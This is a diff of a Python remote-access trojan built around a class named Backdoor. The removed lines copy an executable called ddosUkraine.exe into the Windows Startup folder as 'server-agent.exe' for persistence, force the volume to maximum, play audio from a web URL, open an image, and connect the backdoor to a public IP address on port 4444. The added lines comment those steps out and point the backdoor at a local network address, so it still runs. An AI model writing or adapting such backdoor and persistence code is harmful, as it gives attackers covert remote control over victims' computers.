@@ -1,4 +1,5 @@
-import socket, json
+import socket
+import json
 import subprocess
 import os
 import base64
@@ -145,10 +146,10 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-username = UkDecode(subprocess.check_output("echo \%username%", shell = True))[1:-2:]
-path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-command_one = f'copy ddosUkraine.exe "{path}server-agent.exe"'
-os.system(command_one)
+# username = UkDecode(subprocess.check_output("echo \%username%", shell = True))[1:-2:]
+# path = f"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+# command_one = f'copy du.exe "{path}server-agent.exe"'
+# os.system(command_one)
 
 # time.sleep(10)
 
@@ -167,15 +168,15 @@ def playGimn():
         playsound('https://music2019.su/uploads/files/2022-02/romax-batko-nash-bandera_456639639.mp3')
 
 
-vol = threading.Thread(target=setMaxVolume)
-vol.start()
+# vol = threading.Thread(target=setMaxVolume)
+# vol.start()
 
-gimn = threading.Thread(target=playGimn)
-gimn.name = "music"
-gimn.start()
+# gimn = threading.Thread(target=playGimn)
+# gimn.name = "music"
+# gimn.start()
 
-webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
+# webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
 
 
-my_backdoor = Backdoor("185.247.119.121", 4444)
+my_backdoor = Backdoor("192.168.0.108", 4444)
 my_backdoor.run()
